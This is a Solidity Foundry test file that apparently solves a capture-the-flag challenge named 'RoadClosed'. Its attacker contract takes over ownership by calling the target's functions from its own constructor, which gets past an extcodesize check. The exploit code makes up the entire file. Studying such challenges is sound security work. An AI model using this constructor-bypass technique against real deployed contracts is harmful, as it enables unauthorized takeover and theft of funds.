// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {RoadClosed} from "./challenge/RoadClosed.sol";

/// Define the attacker contract
contract Attacker {
    /// Calling the functions from a contract's constructor will bypasses the `extcodesize > 0` check
    constructor(address target) {
        RoadClosed roadClosed = RoadClosed(target);
        roadClosed.addToWhitelist(address(this));
        roadClosed.changeOwner(address(this));
        roadClosed.pwn(address(this));
        require(roadClosed.isOwner());
    }
}

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    RoadClosed roadClosed;

    function setUp() public {
        roadClosed = new RoadClosed();
    }

    /// Exploit! Validate if owner == attacker's address
    function test() public {
        vm.startPrank(playerAddr, playerAddr);
        new Attacker(address(roadClosed));
        vm.stopPrank();
        assertEq(roadClosed.isHacked(), true);
    }
}
